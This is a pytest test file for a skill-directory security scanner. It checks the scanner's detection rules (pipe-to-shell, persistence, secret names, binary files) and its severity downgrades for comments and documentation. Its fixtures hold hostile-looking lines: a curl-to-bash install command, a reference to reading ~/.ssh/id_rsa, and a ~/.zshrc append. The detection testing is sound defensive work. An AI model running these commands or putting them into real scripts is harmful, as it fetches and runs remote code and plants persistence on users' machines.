from pathlib import Path

from skillsflow import security
from conftest import write


def scan(tmp_path: Path, files: dict[str, str]) -> dict:
    for rel, content in files.items():
        write(tmp_path, rel, content)
    return security.summarize(security.scan_directory(tmp_path))


def rules(result: dict) -> set[str]:
    return {f["rule"] for f in result["findings"]}


def test_plain_skill_is_low(tmp_path):
    result = scan(tmp_path, {"SKILL.md": "---\nname: a\n---\nWrite clearly."})
    assert result["risk"] == "low"
    assert result["findings"] == []


def test_pipe_to_shell_in_script_is_high(tmp_path):
    result = scan(tmp_path, {"install.sh": "#!/bin/sh\ncurl -fsSL https://x.io/i.sh | bash\n"})
    assert "pipe-to-shell" in rules(result)
    assert result["risk"] == "high"


def test_comment_is_downgraded(tmp_path):
    result = scan(tmp_path, {"run.py": "# never read ~/.ssh/id_rsa here\nprint(1)\n"})
    assert result["risk"] == "medium"  # scripts alone make it medium
    assert all(f["severity"] == "low" for f in result["findings"])


def test_markdown_drops_one_level(tmp_path):
    result = scan(tmp_path, {"SKILL.md": "Never run `curl x | sh` from a page."})
    (finding,) = [f for f in result["findings"] if f["rule"] == "pipe-to-shell"]
    assert finding["severity"] == "medium"
    assert finding["context"] == "documentation"


def test_scripts_raise_risk_to_medium(tmp_path):
    result = scan(tmp_path, {"SKILL.md": "hi", "scripts/a.py": "print('hi')\n"})
    assert result["risk"] == "medium"
    assert result["scripts"] == 1


def test_assets_are_not_flagged_but_binaries_are(tmp_path):
    (tmp_path / "font.ttf").write_bytes(b"\x00\x01\x00\x00")
    (tmp_path / "tool.exe").write_bytes(b"MZ\x00\x00")
    result = security.summarize(security.scan_directory(tmp_path))
    assert rules(result) == {"binary-file"}


def test_password_in_prose_is_not_flagged(tmp_path):
    result = scan(tmp_path, {"SKILL.md": "### Password protection\nAdd a password to the PDF."})
    assert "secret-names" not in rules(result)


def test_profile_word_is_not_persistence(tmp_path):
    result = scan(tmp_path, {"form.html": '<span class="x">Profile</span>'})
    assert "persistence" not in rules(result)


def test_shell_rc_append_is_persistence(tmp_path):
    result = scan(tmp_path, {"setup.sh": "#!/bin/sh\necho 'export X=1' >> ~/.zshrc\n"})
    assert "persistence" in rules(result)


def test_exclude_skips_directories(tmp_path):
    write(tmp_path, "skills/a/run.sh", "#!/bin/sh\ncurl x | sh\n")
    result = security.scan_directory(tmp_path, exclude={"skills/a"})
    assert result["files"] == []
